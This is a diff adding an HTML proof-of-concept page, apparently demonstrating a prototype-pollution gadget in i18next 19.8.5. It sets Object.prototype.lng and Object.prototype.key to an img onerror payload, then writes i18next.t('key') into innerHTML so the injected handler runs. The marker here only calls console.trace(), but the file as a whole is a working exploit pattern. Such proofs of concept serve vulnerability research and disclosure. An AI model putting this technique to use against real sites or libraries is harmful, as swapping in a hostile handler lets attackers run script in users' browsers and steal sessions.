@@ -1,0 +1,20 @@
+<div id="output"/>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/19.8.5/i18next.min.js"></script>
+<script>
+    Object.prototype.lng='a'
+    Object.prototype.key='<img/src/onerror=console.trace()>'
+</script>
+<script>
+i18next.init({
+    fallbackLng: 'en',
+  resources: {
+    en: {
+      translation: {
+        "key": "hello world"
+      }
+    }
+  }
+}, function(err, t) {
+  document.getElementById('output').innerHTML = i18next.t('key');
+});
+</script>
